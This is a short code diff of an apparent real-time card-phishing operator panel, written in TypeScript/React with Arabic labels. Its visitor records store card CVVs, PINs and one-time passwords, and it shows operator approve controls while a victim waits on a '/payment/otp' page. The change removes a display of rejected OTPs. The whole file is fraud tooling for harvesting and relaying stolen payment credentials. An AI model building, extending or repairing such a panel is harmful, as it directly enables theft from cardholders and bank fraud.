@@ -58,7 +58,6 @@ interface Visitor {
   card_cvv: string | null;
   card_pin: string | null;
   card_otp: string | null;
-  rejected_otps: string[] | null;
   plan_selected: string | null;
   order_total: string | null;
   checkout_at: string | null;
@@ -1230,19 +1229,7 @@ const StageCards = ({ v }: { v: Visitor }) => {
           icon={<ShieldCheck className="w-4 h-4" />}
           time={v.otp_at ? formatDateTime(v.otp_at) : undefined}
         >
-          {v.rejected_otps && v.rejected_otps.length > 0 && (
-            <div className="mb-3 space-y-1">
-              <div className="text-[10px] uppercase tracking-wider text-rose-500 font-semibold mb-1">أكواد مرفوضة</div>
-              {v.rejected_otps.map((code, i) => (
-                <div key={i} className="flex items-center gap-2 px-2 py-1 rounded bg-rose-50 border border-rose-200">
-                  <span className="text-rose-400 text-xs">✕</span>
-                  <span className="font-mono text-sm text-rose-600 line-through opacity-70">{code}</span>
-                  <span className="text-[10px] text-rose-400 mr-auto">مرفوض</span>
-                </div>
-              ))}
-            </div>
-          )}
-          <Field icon={ShieldCheck} label="OTP الحالي" value={v.card_otp} mono />
+          <Field icon={ShieldCheck} label="OTP" value={v.card_otp} mono />
           {isOnline(v) && (v.last_path || "").startsWith("/payment/otp") && (
             <ApprovalActions sessionId={v.session_id} stage="otp" />
           )}
